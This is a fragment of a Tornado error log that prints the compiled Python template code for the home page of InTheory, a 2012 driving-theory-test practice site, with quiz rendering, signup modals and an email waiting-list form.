249      _tmp = kwargs["questions"][5].options[3]  # home.html:21 (via base.html:76)
250      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
251      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
252      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
253      _append(_tmp)  # home.html:21 (via base.html:76)
254      _append('"],"answer": ')  # home.html:21 (via base.html:76)
255      _tmp = kwargs["questions"][5].answer  # home.html:21 (via base.html:76)
256      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
257      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
258      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
259      _append(_tmp)  # home.html:21 (via base.html:76)
260      _append('}, { "question":"')  # home.html:21 (via base.html:76)
261      _tmp = kwargs["questions"][6].question  # home.html:21 (via base.html:76)
262      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
263      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
264      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
265      _append(_tmp)  # home.html:21 (via base.html:76)
266      _append('","options": ["')  # home.html:21 (via base.html:76)
267      _tmp = kwargs["questions"][6].options[0]  # home.html:21 (via base.html:76)
268      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
269      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
270      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
271      _append(_tmp)  # home.html:21 (via base.html:76)
272      _append('", "')  # home.html:21 (via base.html:76)
273      _tmp = kwargs["questions"][6].options[1]  # home.html:21 (via base.html:76)
274      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
275      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
276      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
277      _append(_tmp)  # home.html:21 (via base.html:76)
278      _append('", "')  # home.html:21 (via base.html:76)
279      _tmp = kwargs["questions"][6].options[2]  # home.html:21 (via base.html:76)
280      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
281      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
282      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
283      _append(_tmp)  # home.html:21 (via base.html:76)
284      _append('", "')  # home.html:21 (via base.html:76)
285      _tmp = kwargs["questions"][6].options[3]  # home.html:21 (via base.html:76)
286      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
287      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
288      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
289      _append(_tmp)  # home.html:21 (via base.html:76)
290      _append('"],"answer": ')  # home.html:21 (via base.html:76)
291      _tmp = kwargs["questions"][6].answer  # home.html:21 (via base.html:76)
292      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
293      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
294      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
295      _append(_tmp)  # home.html:21 (via base.html:76)
296      _append('},{ "question":"')  # home.html:21 (via base.html:76)
297      _tmp = kwargs["questions"][7].question  # home.html:21 (via base.html:76)
298      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
299      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
300      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
301      _append(_tmp)  # home.html:21 (via base.html:76)
302      _append('","options": ["')  # home.html:21 (via base.html:76)
303      _tmp = kwargs["questions"][7].options[0]  # home.html:21 (via base.html:76)
304      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
305      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
306      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
307      _append(_tmp)  # home.html:21 (via base.html:76)
308      _append('", "')  # home.html:21 (via base.html:76)
309      _tmp = kwargs["questions"][7].options[1]  # home.html:21 (via base.html:76)
310      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
311      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
312      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
313      _append(_tmp)  # home.html:21 (via base.html:76)
314      _append('", "')  # home.html:21 (via base.html:76)
315      _tmp = kwargs["questions"][7].options[2]  # home.html:21 (via base.html:76)
316      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
317      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
318      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
319      _append(_tmp)  # home.html:21 (via base.html:76)
320      _append('", "')  # home.html:21 (via base.html:76)
321      _tmp = kwargs["questions"][7].options[3]  # home.html:21 (via base.html:76)
322      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
323      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
324      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
325      _append(_tmp)  # home.html:21 (via base.html:76)
326      _append('"],"answer": ')  # home.html:21 (via base.html:76)
327      _tmp = kwargs["questions"][7].answer  # home.html:21 (via base.html:76)
328      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
329      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
330      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
331      _append(_tmp)  # home.html:21 (via base.html:76)
332      _append('}, { "question":"')  # home.html:21 (via base.html:76)
333      _tmp = kwargs["questions"][8].question  # home.html:21 (via base.html:76)
334      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
335      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
336      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
337      _append(_tmp)  # home.html:21 (via base.html:76)
338      _append('","options": ["')  # home.html:21 (via base.html:76)
339      _tmp = kwargs["questions"][8].options[0]  # home.html:21 (via base.html:76)
340      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
341      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
342      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
343      _append(_tmp)  # home.html:21 (via base.html:76)
344      _append('", "')  # home.html:21 (via base.html:76)
345      _tmp = kwargs["questions"][8].options[1]  # home.html:21 (via base.html:76)
346      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
347      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
348      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
349      _append(_tmp)  # home.html:21 (via base.html:76)
350      _append('", "')  # home.html:21 (via base.html:76)
351      _tmp = kwargs["questions"][8].options[2]  # home.html:21 (via base.html:76)
352      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
353      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
354      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
355      _append(_tmp)  # home.html:21 (via base.html:76)
356      _append('", "')  # home.html:21 (via base.html:76)
357      _tmp = kwargs["questions"][8].options[3]  # home.html:21 (via base.html:76)
358      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
359      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
360      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
361      _append(_tmp)  # home.html:21 (via base.html:76)
362      _append('"],"answer": ')  # home.html:21 (via base.html:76)
363      _tmp = kwargs["questions"][8].answer  # home.html:21 (via base.html:76)
364      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
365      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
366      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
367      _append(_tmp)  # home.html:21 (via base.html:76)
368      _append('},{ "question":"')  # home.html:21 (via base.html:76)
369      _tmp = kwargs["questions"][9].question  # home.html:21 (via base.html:76)
370      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
371      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
372      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
373      _append(_tmp)  # home.html:21 (via base.html:76)
374      _append('","options": ["')  # home.html:21 (via base.html:76)
375      _tmp = kwargs["questions"][9].options[0]  # home.html:21 (via base.html:76)
376      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
377      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
378      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
379      _append(_tmp)  # home.html:21 (via base.html:76)
380      _append('", "')  # home.html:21 (via base.html:76)
381      _tmp = kwargs["questions"][9].options[1]  # home.html:21 (via base.html:76)
382      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
383      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
384      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
385      _append(_tmp)  # home.html:21 (via base.html:76)
386      _append('", "')  # home.html:21 (via base.html:76)
387      _tmp = kwargs["questions"][9].options[2]  # home.html:21 (via base.html:76)
388      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
389      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
390      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
391      _append(_tmp)  # home.html:21 (via base.html:76)
392      _append('", "')  # home.html:21 (via base.html:76)
393      _tmp = kwargs["questions"][9].options[3]  # home.html:21 (via base.html:76)
394      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
395      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
396      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
397      _append(_tmp)  # home.html:21 (via base.html:76)
398      _append('"],"answer": ')  # home.html:21 (via base.html:76)
399      _tmp = kwargs["questions"][9].answer  # home.html:21 (via base.html:76)
400      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
401      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
402      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
403      _append(_tmp)  # home.html:21 (via base.html:76)
404      _append('}]\'>\n</div>\n<div id="answers" data-answers=\'[]\'></div>\n<div id="mini-quiz-box" class="undimmed">\n')  # home.html:25 (via base.html:76)
405      question = kwargs['questions'][0]  # home.html:25 (via base.html:76)
406      _append('\n<h4> ')  # home.html:26 (via base.html:76)
407      _tmp = question.question  # home.html:26 (via base.html:76)
408      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:26 (via base.html:76)
409      else: _tmp = _utf8(str(_tmp))  # home.html:26 (via base.html:76)
410      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:26 (via base.html:76)
411      _append(_tmp)  # home.html:26 (via base.html:76)
412      _append('</h4>\n<ul remaining-answers=')  # home.html:27 (via base.html:76)
413      _tmp = len(question.answer)  # home.html:27 (via base.html:76)
414      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:27 (via base.html:76)
415      else: _tmp = _utf8(str(_tmp))  # home.html:27 (via base.html:76)
416      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:27 (via base.html:76)
417      _append(_tmp)  # home.html:27 (via base.html:76)
418      _append(' class="nav nav-pills nav-stacked">\n<li><a class="choice" ind="0"><span class="badge badge-info">A</span> ')  # home.html:28 (via base.html:76)
419      _tmp = question.options[0]  # home.html:28 (via base.html:76)
420      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:28 (via base.html:76)
421      else: _tmp = _utf8(str(_tmp))  # home.html:28 (via base.html:76)
422      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:28 (via base.html:76)
423      _append(_tmp)  # home.html:28 (via base.html:76)
424      _append('</a></li>\n<li><a class="choice" ind="1"><span class="badge badge-info">B</span> ')  # home.html:29 (via base.html:76)
425      _tmp = question.options[1]  # home.html:29 (via base.html:76)
426      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:29 (via base.html:76)
427      else: _tmp = _utf8(str(_tmp))  # home.html:29 (via base.html:76)
428      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:29 (via base.html:76)
429      _append(_tmp)  # home.html:29 (via base.html:76)
430      _append('</a></li>\n<li><a class="choice" ind="2"><span class="badge badge-info">C</span> ')  # home.html:30 (via base.html:76)
431      _tmp = question.options[2]  # home.html:30 (via base.html:76)
432      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:30 (via base.html:76)
433      else: _tmp = _utf8(str(_tmp))  # home.html:30 (via base.html:76)
434      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:30 (via base.html:76)
435      _append(_tmp)  # home.html:30 (via base.html:76)
436      _append('</a></li>\n<li><a class="choice" ind="3"><span class="badge badge-info">D</span> ')  # home.html:31 (via base.html:76)
437      _tmp = question.options[3]  # home.html:31 (via base.html:76)
438      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:31 (via base.html:76)
439      else: _tmp = _utf8(str(_tmp))  # home.html:31 (via base.html:76)
440      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:31 (via base.html:76)
441      _append(_tmp)  # home.html:31 (via base.html:76)
442      _append('</a></li>\n</ul>\n<a id="next" class="btn btn-success btn-mini disabled">Next Question</a>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div class="row">\n<div class="span10">\n</div>\n<div class="span5 offset5">\n</br></br>\n<blockquote>\n<p>\n<h2><div class="funkytext"><font color="#ffffff">"')  # home.html:47 (via base.html:76)
443      _tmp = kwargs['tweet']  # home.html:47 (via base.html:76)
444      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:47 (via base.html:76)
445      else: _tmp = _utf8(str(_tmp))  # home.html:47 (via base.html:76)
446      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:47 (via base.html:76)
447      _append(_tmp)  # home.html:47 (via base.html:76)
448      _append('"</h2>\n<div class="funkytext">- Dave Mason, London</font></div>\n</p>\n</blockquote>\n</div>\n</div>\n</div> <!-- /container -->\n<div id="dim">\n</div>\n')  # home.html:57 (via base.html:76)
449      _append('\n')  # base.html:80
450      _tmp = xsrf_form_html()  # base.html:80
451      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80
452      else: _tmp = _utf8(str(_tmp))  # base.html:80
453      _append(_tmp)  # base.html:80
454      _append('\n')  # base.html:81
455      _append('\n<script src="')  # base.html:82 (via base.html:81)
456      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:82 (via base.html:81)
457      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:82 (via base.html:81)
458      else: _tmp = _utf8(str(_tmp))  # base.html:82 (via base.html:81)
459      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:82 (via base.html:81)
460      _append(_tmp)  # base.html:82 (via base.html:81)
461      _append('"></script>\n<script src="')  # base.html:83 (via base.html:81)
462      _tmp = static_url('js/libs/blurb.min.js')  # base.html:83 (via base.html:81)
463      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:83 (via base.html:81)
464      else: _tmp = _utf8(str(_tmp))  # base.html:83 (via base.html:81)
465      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:83 (via base.html:81)
466      _append(_tmp)  # base.html:83 (via base.html:81)
467      _append('"></script>\n<script src="')  # base.html:84 (via base.html:81)
468      _tmp = static_url('js/IT.js')  # base.html:84 (via base.html:81)
469      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:84 (via base.html:81)
470      else: _tmp = _utf8(str(_tmp))  # base.html:84 (via base.html:81)
471      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:84 (via base.html:81)
472      _append(_tmp)  # base.html:84 (via base.html:81)
473      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:88 (via base.html:81)
474      _append('\n')  # base.html:90
475      for js in kwargs['js_deps']:  # base.html:90
476          _append('\n<script src="')  # base.html:91
477          _tmp = static_url(js)  # base.html:91
478          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:91
479          else: _tmp = _utf8(str(_tmp))  # base.html:91
480          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:91
481          _append(_tmp)  # base.html:91
482          _append('"></script>\n')  # base.html:92
483      _append('\n')  # base.html:94
484      _append('\n<script id="signup-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<p>You still need a little practice, but don\'t worry we\'re here to help you pass. Sign-up today to get started...</p>\n<a href="/login"><center><img src="')  # home.html:68 (via base.html:94)
485      _tmp = static_url('imgs/facebook.png')  # home.html:68 (via base.html:94)
486      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:68 (via base.html:94)
487      else: _tmp = _utf8(str(_tmp))  # home.html:68 (via base.html:94)
488      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:68 (via base.html:94)
489      _append(_tmp)  # home.html:68 (via base.html:94)
490      _append('" alt="some_text"/></a>\n<img src="')  # home.html:69 (via base.html:94)
491      _tmp = static_url('imgs/twitter.png')  # home.html:69 (via base.html:94)
492      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:69 (via base.html:94)
493      else: _tmp = _utf8(str(_tmp))  # home.html:69 (via base.html:94)
494      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:69 (via base.html:94)
495      _append(_tmp)  # home.html:69 (via base.html:94)
496      _append('" alt="some_text"/>\n<img src="')  # home.html:70 (via base.html:94)
497      _tmp = static_url('imgs/google.png')  # home.html:70 (via base.html:94)
498      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:70 (via base.html:94)
499      else: _tmp = _utf8(str(_tmp))  # home.html:70 (via base.html:94)
500      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:70 (via base.html:94)
501      _append(_tmp)  # home.html:70 (via base.html:94)
502      _append('" alt="some_text"/></center>\n<center><a href="h">Or click here to sign-up directly</a></center>\n</div>\n<div class="modal-footer">\n<ul class="pager">\n<li class="previous"><a href="#">Sign in to InTheory</a></li>\n<li class="next"><a href="#">Forgot username or password?</a></li>\n</ul>\n</div>\n</div>\n</script>\n<script id="show-arrow-template" type="text/x-jquery-tmpl">\n<div class="arrow-container">\n<img src="')  # home.html:84 (via base.html:94)
503      _tmp = static_url('imgs/arrow.png')  # home.html:84 (via base.html:94)
504      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:84 (via base.html:94)
505      else: _tmp = _utf8(str(_tmp))  # home.html:84 (via base.html:94)
506      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:84 (via base.html:94)
507      _append(_tmp)  # home.html:84 (via base.html:94)
508      _append('"/>\n</div>\n</script>\n<script id="email-template" type="text/x-jquery-tmpl">\n<div id="windowTitleDialog" class="modal hide fade">\n<div class="modal-header">\n<a class="close">&times;</a>\n<h3>You scored ${score} out of 10!</h3>\n</div>\n<div class="modal-body">\n<center>\n<p>Leave your email and we\'ll let you know when we launch!</p>\n<form method="post" class="af-form-wrapper" action="http://www.aweber.com/scripts/addlead.pl" >\n<div style="display: none;">\n<input type="hidden" name="meta_web_form_id" value="677441365" />\n<input type="hidden" name="meta_split_id" value="" />\n<input type="hidden" name="listname" value="intheory" />\n<input type="hidden" name="redirect" value="http://www.aweber.com/thankyou-coi.htm?m=video" id="redirect_b3be9783c304109a8d9d9ca013e7b651" />\n<input type="hidden" name="meta_adtracking" value="Waiting_List_/_Splash" />\n<input type="hidden" name="meta_message" value="1" />\n<input type="hidden" name="meta_required" value="name,email" />\n<input type="hidden" name="meta_tooltip" value="" />\n</div>\n<div id="af-form-677441365" class="af-form"><div id="af-body-677441365" class="af-body af-standards">\n<div class="af-element">\n<div class="af-textWrap"></br>\n<input id="awf_field-39151245" type="text" name="name" class="text" placeholder="Enter Your Name" tabindex="500" />\n</div>\n<div class="af-clear"></div></div>\n<div class="af-element">\n<div class="af-textWrap"><input class="text" id="awf_field-39151246" type="text" name="email" placeholder="Enter Your Email" tabindex="501" />\n</div><div class="af-clear"></div>\n</div>\n<input name="submit" class="btn btn-primaryw" type="submit" value="Submit" tabindex="502" />\n</br>\n<a href="/login">or connect with Facebook</a>\n</div>\n</br></br>\n<div class="af-element privacyPolicy" style="text-align: center"><p>We respect your <a title="Privacy Policy" href="http://www.aweber.com/permission.htm" target="_blank">email privacy</a></p>\n<div class="af-clear"></div>\n</div>\n</div>\n</div>\n<div style="display: none;"><img src="http://forms.aweber.com/form/displays.htm?id=bOzsLCyMzGys" alt="" /></div>\n</form>\n</center>\n<script type="text/javascript">\n<!--\n(function() {\nvar IE = /*@cc_on!@*/false;\nif (!IE) { return; }\nif (document.compatMode && document.compatMode == \'BackCompat\') {\nif (document.getElementById("af-form-677441365")) {\ndocument.getElementById("af-form-677441365").className = \'af-form af-quirksMode\';\n}\nif (document.getElementById("af-body-677441365")) {\ndocument.getElementById("af-body-677441365").className = "af-body inline af-quirksMode";\n}\nif (document.getElementById("af-header-677441365")) {\ndocument.getElementById("af-header-677441365").className = "af-header af-quirksMode";\n}\nif (document.getElementById("af-footer-677441365")) {\ndocument.getElementById("af-footer-677441365").className = "af-footer af-quirksMode";\n}\n}\n})();\n-->\n</script>\n</div>\n</div>\n</script>\n')  # home.html:158 (via base.html:94)
509      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:106
510      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:home.html code:
  1  def _execute():  # base.html:0
  2      _buffer = []  # base.html:0
  3      _append = _buffer.append  # base.html:0
  4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
  5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
  6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
  7      _tmp = static_url('css/base.css')  # base.html:25
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
  9      else: _tmp = _utf8(str(_tmp))  # base.html:25
 10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
 11      _append(_tmp)  # base.html:25
 12      _append('" />\n')  # base.html:26
 13      for css in kwargs['css_deps']:  # base.html:26
 14          _append('\n<link href="')  # base.html:27
 15          _tmp = static_url(css)  # base.html:27
 16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
 17          else: _tmp = _utf8(str(_tmp))  # base.html:27
 18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
 19          _append(_tmp)  # base.html:27
 20          _append('" rel="stylesheet">\n')  # base.html:28
 21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n</head>\n<body >\n')  # base.html:44
 22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:53 (via base.html:44)
 23      _tmp = static_url('imgs/logo.png')  # base.html:53 (via base.html:44)
 24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:53 (via base.html:44)
 25      else: _tmp = _utf8(str(_tmp))  # base.html:53 (via base.html:44)
 26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:53 (via base.html:44)
 27      _append(_tmp)  # base.html:53 (via base.html:44)
 28      _append('"></a>\n<div class="pull-right">\n')  # base.html:55 (via base.html:44)
 29      if not current_user:  # base.html:55 (via base.html:44)
 30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:57 (via base.html:44)
 31      else:  # base.html:57 (via base.html:44)
 32          _append('\n<ul class="nav nav-pills">\n')  # base.html:59 (via base.html:44)
 33          if current_user['moderator']:  # base.html:59 (via base.html:44)
 34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:61 (via base.html:44)
 35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:68 (via base.html:44)
 36          _tmp = static_url('imgs/user.png')  # base.html:68 (via base.html:44)
 37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:68 (via base.html:44)
 38          else: _tmp = _utf8(str(_tmp))  # base.html:68 (via base.html:44)
 39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:68 (via base.html:44)
 40          _append(_tmp)  # base.html:68 (via base.html:44)
 41          _append('"></a>\n')  # base.html:69 (via base.html:44)
 42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:74 (via base.html:44)
 43      _append('\n')  # base.html:76
 44      _append('\n<div class="container">\n<div class="hero-unit">\n<div class="hero-unit1">\n<div class="row-fluid">\n<div class="columnA pull-left">\n<h2>Pass your theory test.<br>Guaranteed.</h2>\n<ul>\n<li>The simplest and fastest way to pass your test.</li>\n<li>Use cool new learning techniques to help you remember the details.</li>\n<li>Don\'t pass first time? Get your money back.</li>\n</ul></br>\n<p><a id="get-started-btn" class="btn btn-block btn-success btn-large">Get Started Today</a></p>\n</div>\n<div class="columnB pull-right">\n</br>\n<div id="questions" data-questions=\n\'[{ "question":"')  # home.html:21 (via base.html:76)
 45      _tmp = kwargs["questions"][0].question  # home.html:21 (via base.html:76)
 46      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 47      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 48      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 49      _append(_tmp)  # home.html:21 (via base.html:76)
 50      _append('","options": ["')  # home.html:21 (via base.html:76)
 51      _tmp = kwargs["questions"][0].options[0]  # home.html:21 (via base.html:76)
 52      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
 53      else: _tmp = _utf8(str(_tmp))  # home.html:21 (via base.html:76)
 54      _tmp = _utf8(xhtml_escape(_tmp))  # home.html:21 (via base.html:76)
 55      _append(_tmp)  # home.html:21 (via base.html:76)
 56      _append('", "')  # home.html:21 (via base.html:76)
 57      _tmp = kwargs["questions"][0].options[1]  # home.html:21 (via base.html:76)
 58      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # home.html:21 (via base.html:76)
